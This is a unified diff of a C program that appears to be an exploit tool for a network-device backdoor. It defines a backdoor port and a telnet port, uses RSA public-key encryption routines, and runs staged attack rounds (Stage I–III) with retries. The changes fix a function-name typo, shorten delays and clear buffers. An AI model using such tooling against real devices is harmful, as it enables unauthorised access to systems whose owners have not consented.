@@ -13,9 +13,8 @@
 #include <openssl/rsa.h>
 
 
-#define RECV_TIMEOUT 1000000
 #define SCAN_DELAY  300000
-#define STAGE_DELAY 1000000
+#define STAGE_DELAY 10000
 #define BACKDOOR_PORT 21210
 #define TELNET_PORT 23
 #define PLAINTEXT_LENGTH 0x20
@@ -113,7 +112,7 @@ int decrypt_with_pubkey(RSA *rsa, unsigned char *ciphertext, unsigned char *plai
 }
 
 
-int encrypy_with_pubkey(RSA *rsa, unsigned char *plaintext, unsigned char *ciphertext) {
+int encrypt_with_pubkey(RSA *rsa, unsigned char *plaintext, unsigned char *ciphertext) {
   int sz;
   memset(ciphertext,0,CIPHERTEXT_LENGTH);
   sz = RSA_size(rsa);
@@ -180,7 +179,7 @@ int test() {
   };
 
   printf("[=] Test case: '%s'\n", test_case);
-  encrypy_with_pubkey(rsa, (unsigned char *) test_case, ciphertext);
+  encrypt_with_pubkey(rsa, (unsigned char *) test_case, ciphertext);
 
   res = memcmp(ciphertext, expected, CIPHERTEXT_LENGTH);
   if (res != 0) {
@@ -524,7 +523,7 @@ int main(int argc, char **argv) {
     fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
     fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, 
         strlen((char *) plaintext));
-    encrypy_with_pubkey(rsa, plaintext, ciphertext);
+    encrypt_with_pubkey(rsa, plaintext, ciphertext);
     hexdump(ciphertext, CIPHERTEXT_LENGTH);
     exit(0);
   } else if (!(strcmp(argv[1], "dec"))) {
@@ -559,7 +558,7 @@ int main(int argc, char **argv) {
   int backdoor_port;
   int CHAOS_MODE = 0;
 
-  int stage_delay = 10000;
+  int stage_delay = STAGE_DELAY;
   struct DeviceList *device_list;
   struct DeviceList *device_info;
   device_list = init_device_list();
@@ -660,7 +659,7 @@ int main(int argc, char **argv) {
 
 
 #define QUALITY_CONTROL(__com_res) { if ((__com_res) == -1) { \
-  printf("[x] What we have here is a failure to communicate. Restarting.\n"); \
+  printf("[x] What we have here is a failure to communicate.\n"); \
   stage_delay += 1000; \
   /* goto STAGE_I; */ \
 } else if (stage_delay > 100) { \
@@ -677,6 +676,7 @@ int main(int argc, char **argv) {
 STAGE_I:
     on_try += 1;
     usleep(stage_delay);
+    memset(buffer, 0, 0x80);
     bar('=');
     printf("[*] ENTERING STAGE I (round %d/%d) (delay = %d)%s\n", on_try, tries,
         stage_delay,
@@ -721,6 +721,7 @@ STAGE_I:
 
 STAGE_II:
     usleep(stage_delay);
+    memset(buffer, 0, 0x80);
     bar('=');
     printf("[*] ENTERING STAGE II (round %d/%d) (delay = %d)%s\n", on_try, tries,
         stage_delay,
@@ -742,6 +743,7 @@ STAGE_II:
 
 STAGE_III:
     usleep(stage_delay);
+    memset(buffer, 0, 0x80);
     bar('=');
     printf("[*] ENTERING STAGE III (round %d/%d) (delay = %d)%s\n", on_try, tries, 
         stage_delay,
